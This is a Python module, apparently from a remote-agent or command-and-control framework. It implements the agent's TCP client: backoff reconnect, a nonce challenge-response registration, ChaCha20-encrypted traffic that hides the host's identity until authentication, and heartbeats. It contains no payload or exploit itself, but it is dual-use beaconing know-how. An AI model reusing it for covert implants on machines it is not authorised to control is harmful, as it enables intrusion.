"""TCP client connecting remote Agent to C2.

Handles:

- Async TCP dial to ``c2_address`` with exponential-backoff reconnect.
- Sends ``register`` packet after TCP connect.
- Periodic ``heartbeat`` packets to keep the connection alive.
- Reads incoming packets and feeds them to a Handler.
"""

import asyncio
import hashlib
import hmac
import logging
import platform
import secrets
import socket
import time
from typing import Callable, Optional

from common.crypto import NONCE_AGENT_TO_C2, NONCE_C2_TO_AGENT, ChaCha20, EncryptedStream, derive_key
from common.protocol import (
    CMD_HEARTBEAT,
    CMD_REGISTER,
    CMD_REGISTER_CONFIRM,
    CMD_REGISTER_RESPONSE,
    PacketReader,
    encode_control,
)


logger = logging.getLogger(__name__)


class AgentClient:
    def __init__(
        self,
        c2_host: str,
        c2_port: int,
        agent_id: str,
        auth_token: str,
        heartbeat_interval: int = 30,
        reconnect_initial: float = 1.0,
        reconnect_max: float = 60.0,
    ) -> None:
        self._c2_host = c2_host
        self._c2_port = c2_port
        self._agent_id = agent_id
        self._auth_token = auth_token
        self._heartbeat_interval = heartbeat_interval
        self._reconnect_initial = reconnect_initial
        self._reconnect_max = reconnect_max
        self._reader = PacketReader()
        self._connected = False
        self._on_packet: Optional[Callable] = None
        self._writer: Optional[asyncio.StreamWriter] = None
        self._stream: Optional[EncryptedStream] = None
        self._write_lock = asyncio.Lock()
        self._hb_task: Optional[asyncio.Task] = None
        self._stopped = False
        self._next_request_id = 1

    @property
    def write_lock(self) -> asyncio.Lock:
        return self._write_lock

    def set_packet_handler(self, handler) -> None:
        self._on_packet = handler
        if handler is not None and hasattr(handler, '_write_lock'):
            handler._write_lock = self._write_lock

    @property
    def connected(self) -> bool:
        return self._connected

    def next_request_id(self) -> int:
        rid = self._next_request_id
        self._next_request_id += 1
        return rid

    async def run(self) -> None:
        delay = self._reconnect_initial
        while not self._stopped:
            try:
                await self._connect_and_serve()
            except asyncio.CancelledError:
                raise
            except Exception as e:
                logger.warning(f"connection error: {e}")
            self._connected = False
            if self._stopped:
                return
            try:
                await asyncio.sleep(delay)
            except asyncio.CancelledError:
                return
            delay = min(delay * 2, self._reconnect_max)

    def request_shutdown(self) -> None:
        """Called by Handler on CMD_SHUTDOWN: stop reconnect loop and exit."""
        self._stopped = True

    async def stop(self) -> None:
        self._stopped = True
        if self._hb_task is not None:
            self._hb_task.cancel()
            try:
                await self._hb_task
            except (asyncio.CancelledError, Exception):
                pass
        if self._writer is not None:
            self._writer.close()

    async def _connect_and_serve(self) -> None:
        reader, writer = await asyncio.open_connection(self._c2_host, self._c2_port)
        self._writer = writer
        self._reader = PacketReader()
        if self._on_packet is not None and hasattr(self._on_packet, "reset"):
            self._on_packet.reset()
        # Derive the ChaCha20 key before the handshake: after the challenge is
        # verified, the (now encrypted) register_confirm is the first packet of
        # the Agent -> C2 encrypted stream, so tx must be shared between the
        # confirm and all subsequent Agent -> C2 traffic.
        key = derive_key(self._auth_token)
        tx = ChaCha20(key, NONCE_AGENT_TO_C2)
        rx = ChaCha20(key, NONCE_C2_TO_AGENT)
        if not await self._handshake(reader, writer, tx):
            logger.warning("registration handshake failed")
            writer.close()
            self._writer = None
            return
        # Handshake + auth succeeded: the whole byte stream is now encrypted.
        stream = EncryptedStream(reader, writer, tx, rx)
        self._stream = stream
        stream.absorb_leftover(self._reader)
        if self._reader.buffered:
            leftover = self._reader.drain_all()
            if self._on_packet is not None:
                self._on_packet.feed(leftover)
                await self._on_packet.process(stream, stream)
        self._connected = True
        logger.info(f"connected to C2 at {self._c2_host}:{self._c2_port}")

        self._hb_task = asyncio.create_task(self._heartbeat_loop(stream))

        try:
            while not self._stopped:
                chunk = await stream.read(4096)
                if not chunk:
                    raise ConnectionError("C2 closed connection")
                if self._on_packet is None:
                    continue
                self._on_packet.feed(chunk)
                await self._on_packet.process(stream, stream)
        finally:
            self._connected = False
            if self._hb_task is not None:
                self._hb_task.cancel()
                try:
                    await self._hb_task
                except Exception:
                    pass
                self._hb_task = None
            writer.close()
            self._writer = None
            self._stream = None

    async def _handshake(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter, tx: ChaCha20) -> bool:
        """Challenge-response registration with the C2.

        Sends a ``register`` packet carrying ONLY a random nonce (no agent id /
        hostname / os yet, so identity is not leaked before authentication).
        Receives the C2's ``sha256(nonce + c2_auth_tokens)`` challenge, verifies
        it against the locally stored token, and only after verification sends
        ``register_confirm`` now carrying the identity fields
        (agent_id, hostname, os). The confirm packet is ENCRYPTED with ``tx``
        (the first packet of the Agent -> C2 ChaCha20 stream), so the identity
        never travels in plaintext. Returns False (and disconnects) on any
        verification failure.
        """
        nonce = secrets.token_hex(16)
        req_id = self.next_request_id()
        pkt = encode_control(req_id, CMD_REGISTER, [nonce])
        async with self._write_lock:
            writer.write(pkt)
            await writer.drain()

        expected = await self._receive_register_response(reader)
        if expected is None:
            return False

        local = hashlib.sha256((nonce + self._auth_token).encode("utf-8")).hexdigest()
        if not hmac.compare_digest(local, expected):
            logger.warning("auth verification failed (token mismatch)")
            return False

        hostname = socket.gethostname()
        os_name = _detect_os()
        req_id = self.next_request_id()
        pkt = encode_control(
            req_id, CMD_REGISTER_CONFIRM, [self._agent_id, hostname, os_name]
        )
        async with self._write_lock:
            writer.write(tx.crypt(pkt))
            await writer.drain()
        return True

    async def _receive_register_response(self, reader: asyncio.StreamReader) -> Optional[str]:
        """Wait for the C2's register_response (challenge hash)."""
        deadline = time.time() + 30
        while time.time() < deadline:
            pkt = self._reader.next_packet()
            if pkt is not None:
                _req_id, _body_len, cmd, body = pkt
                if cmd == CMD_REGISTER_RESPONSE:
                    return body.decode("utf-8", errors="replace").strip()
                return None
            remaining = deadline - time.time()
            if remaining <= 0:
                return None
            try:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=remaining)
            except asyncio.TimeoutError:
                return None
            if not chunk:
                return None
            self._reader.feed(chunk)
        return None

    async def _heartbeat_loop(self, stream: EncryptedStream) -> None:
        try:
            while True:
                await asyncio.sleep(self._heartbeat_interval)
                req_id = self.next_request_id()
                pkt = encode_control(req_id, CMD_HEARTBEAT, [str(_now())])
                async with self._write_lock:
                    stream.write(pkt)
                    await stream.drain()
        except asyncio.CancelledError:
            return
        except Exception as e:
            logger.warning(f"heartbeat error: {e}")


def _detect_os() -> str:
    s = platform.system().lower()
    if s == "windows":
        return "Windows"
    if s == "linux":
        return "Linux"
    if s == "darwin":
        return "macOS"
    return s


def _now() -> int:
    return int(time.time())